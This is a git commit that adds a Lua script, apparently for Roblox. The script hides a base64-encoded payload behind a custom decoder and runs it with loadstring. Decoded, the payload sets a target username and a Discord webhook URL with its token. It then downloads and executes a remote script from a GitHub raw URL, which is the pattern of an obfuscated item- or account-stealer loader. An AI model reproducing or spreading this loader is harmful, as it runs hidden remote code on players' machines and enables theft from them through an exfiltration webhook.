40fae1963e5c0618d6342148a79f0e767062750c
214Eli <busterbishop22@icloud.com>
2025-03-04 04:30:10 +0800

    Created new script file

---
+++ scripts/script-13e5119344c2.lua
@@ -0,0 +1,23 @@
+
+-- Obfuscated script
+local encodedScript = "ClVzZXJuYW1lID0gIlJvYmxveF8xMm5hcnV0byIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS93ZWJob29rcy8xMzQ2MjE3MzE3MDQ2MDMwMzY2L001eWdJQ1VYbGJxeGRsTnhIMEp2SlBoVVVUT3l6S0lXVHcyY3pRZm1acmJHZWhLTGZPNFc5VXFzREJuZ19hUGVoX3NtIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvZmlzY2gvcmVmcy9oZWFkcy9tYWluL2Zpc2NoIiwgdHJ1ZSkpKCk="
+
+-- Decode function
+local function decode(str)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Run the decoded script
+loadstring(decode(encodedScript))()
